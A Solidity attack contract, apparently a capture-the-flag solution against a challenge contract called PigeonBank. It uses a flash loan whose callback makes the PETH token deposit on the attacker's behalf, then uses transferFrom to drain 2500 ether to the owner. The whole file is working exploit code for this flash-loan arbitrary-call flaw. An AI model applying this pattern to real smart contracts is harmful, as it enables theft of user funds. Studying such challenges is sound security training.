// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./PETH.sol";
import "./PigeonBank.sol";

contract Attack
{
    PigeonBank public pigeonBank;
    PETH public peth;
    address owner;

    constructor(address _pigeonBankAddress) {
        pigeonBank = PigeonBank(payable(_pigeonBankAddress));
        peth = PETH(pigeonBank.peth());
        owner = msg.sender;
    }

    function attack(address _setup) public payable {
        pigeonBank.flashLoan(address(peth), abi.encodeWithSignature("deposit(address)", address(this)),  2500 ether);
        pigeonBank.transferFrom(address(pigeonBank), owner, 2500 ether);
    }
}